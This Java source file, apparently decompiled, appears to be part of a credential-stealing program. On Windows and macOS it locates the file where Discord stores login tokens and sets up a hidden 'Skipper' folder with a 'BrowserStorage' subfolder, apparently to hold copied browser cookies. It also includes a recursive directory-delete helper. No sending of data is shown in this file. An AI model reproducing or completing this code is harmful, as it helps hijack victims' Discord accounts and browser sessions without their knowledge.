package main;

import java.io.File;
import java.io.IOException;
import java.nio.file.Path;
import java.nio.file.Paths;

public class StartUp extends Main {

    protected static void startUp() throws IOException {
        String finalPath = "";
        Path thisFile;
        String userPath;
        String directory;
        String userName;
        int userNameLength;
        if (OSCheck.isWindows()) {
            thisFile = Paths.get("this").toAbsolutePath();
            userPath = thisFile.toString();
            directory = userPath.substring(9);
            userName = directory.substring(0, directory.indexOf("\\"));
            userNameLength = userName.length();
            userDirectory = userPath.substring(0, 9 + userNameLength);
            finalPath = userDirectory + "\\AppData\\Roaming\\discord\\Local Storage\\https_discordapp.com_0.localstorage";
            tokenLocation = Paths.get(finalPath).toFile();
            baseFolder = new File(userDirectory + "\\AppData\\Local\\Skipper");
            browserCookiesFolder = new File(userDirectory + "\\AppData\\Local\\Skipper\\BrowserStorage");
            settingsFile = new File(userDirectory + "\\AppData\\Local\\Skipper\\Settings.txt");
            imageFile = new File(userDirectory + "\\AppData\\Local\\Skipper\\Text.png");
            checkForFiles();
        } else if (OSCheck.isMac()) {
            thisFile = Paths.get("this").toAbsolutePath();
            userPath = thisFile.toString();
            directory = userPath.substring(9);
            userName = directory.substring(0, directory.indexOf("/"));
            userNameLength = userName.length();
            userDirectory = userPath.substring(0, 9 + userNameLength);
            finalPath = userDirectory + "/Library/Application Support/discord/Local Storage/https_discordapp.com_0.localstorage";
            tokenLocation = Paths.get(finalPath).toFile();
            baseFolder = new File(userDirectory + "/Library/Application Support/Skipper");
            baseFolder.mkdir();
            browserCookiesFolder = new File(userDirectory + "/Library/Application Support/Skipper/BrowserStorage");
            browserCookiesFolder.mkdir();
            settingsFile = new File(userDirectory + "/Library/Application Support/Skipper/Settings.txt");
            imageFile = new File(userDirectory + "/Library/Application Support/Skipper/Text.png");
            checkForFiles();
        } else {
            System.out.println("Your OS is not support!!");
        }

    }

    public static void checkForFiles() throws IOException {
        if (!baseFolder.exists()) {
            baseFolder.mkdir();
        }

        if (!browserCookiesFolder.exists()) {
            browserCookiesFolder.mkdir();
        }

        if (!settingsFile.exists()) {
            settingsFile.createNewFile();
        }

    }

    public static boolean deleteDirectory(File dir) {
        if (dir.isDirectory()) {
            File[] children = dir.listFiles();

            for(int i = 0; i < children.length; ++i) {
                boolean success = deleteDirectory(children[i]);
                if (!success) {
                    return false;
                }
            }
        }

        return dir.delete();
    }
}
